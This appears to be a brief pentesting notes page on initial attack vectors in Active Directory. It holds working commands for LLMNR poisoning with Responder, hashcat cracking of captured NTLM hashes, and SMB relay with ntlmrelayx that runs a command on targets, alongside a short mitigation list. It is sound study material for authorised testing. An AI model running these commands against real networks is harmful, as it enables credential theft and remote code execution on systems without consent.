# AD Initial attack vector

## LLMNR poisoning

<figure><img src=".gitbook/assets/Capture d&#x27;écran 2024-05-06 003240.png" alt=""><figcaption></figcaption></figure>

```
sudo responder -I <interface> -dwPv
# crack hash 
hashcat -m 5600 <hash.txt> <wordlist>
```

### Mitigation

```
# Disable LLMNR
# Disable NBT-NS


#If we can't disable
# Require network access control
# Require strong password policy

```

## SMB Relay

* SMB Signing disabled on target

```bash
nmap --script=smb2-security-mode.nse -p445 <ip>/24
# work if message signing is enabled but not required
# In /etc/responder/Responder.conf disable smb and http -> Not capture its but relay its

# create target.txt and put ip addresses

responder -I <interface> -dwPv 

# ntmrelayx for relay hash
sudo ntlmrelayx.py -tf targets.txt -smb2support
# after intercepted
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"


```

